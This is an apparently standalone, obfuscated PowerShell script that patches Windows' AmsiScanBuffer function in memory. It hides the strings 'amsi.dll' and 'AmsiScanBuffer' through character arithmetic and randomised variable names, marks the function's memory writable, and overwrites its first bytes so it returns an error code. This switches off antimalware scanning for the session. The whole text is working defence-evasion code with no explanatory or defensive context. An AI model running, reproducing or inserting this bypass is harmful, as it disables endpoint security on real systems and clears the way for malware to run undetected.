$ixSs = @"
using System;
using System.Runtime.InteropServices;
public class ixSs {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr IapNjFReJsEdOGuoO, string BDvdBNOF2FOMZ);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr rrtO0C19MhIjHMfH, UIntPtr hYrat7HsM7Bs, uint ZG3k6zbtH1, out uint BcgJbQWVs6iHSHC);
}
"@

Add-Type $ixSs

$pnYDBhFgh47Ws58fOc = [ixSs]::LoadLibrary("$([chAr](15+82)+[chAR](109)+[ChAr](115)+[cHaR](105)+[cHar]([bYte]0x2e)+[char]([bYTe]0x64)+[CHAR]([bYte]0x6c)+[CHAr](37+71))")
$_ALs = [ixSs]::GetProcAddress($pnYDBhFgh47Ws58fOc, "$([chAr](65+12-12)+[CHAR]([bytE]0x6d)+[cHAR]([BYtE]0x73)+[cHAr]([Byte]0x69)+[chaR](83+29-29)+[cHAR](40+59)+[ChAR](97)+[ChAr]([BYTE]0x6e)+[CHaR](66*34/34)+[chaR]([Byte]0x75)+[CHAR]([ByTe]0x66)+[cHar]([BYte]0x66)+[cHAr](101*63/63)+[ChAR](114))")
$p = 0
[ixSs]::VirtualProtect($_ALs, [uint32]5, 0x40, [ref]$p)
$Mp8WEq41puf = "0xB8"
$x68cEkZzQMoH50I3lN9p = "0x57"
$CIRsYC8 = "0x00"
$YqQZAW1WXVkAwspjkK = "0x07"
$L4Tk9xcH8 = "0x80"
$VaSbawHEnCdf = "0xC3"
$Ozl4LgD9RVCCbQj = [Byte[]] ($Mp8WEq41puf,$x68cEkZzQMoH50I3lN9p,$CIRsYC8,$YqQZAW1WXVkAwspjkK,+$L4Tk9xcH8,+$VaSbawHEnCdf)
[System.Runtime.InteropServices.Marshal]::Copy($Ozl4LgD9RVCCbQj, 0, $_ALs, 6)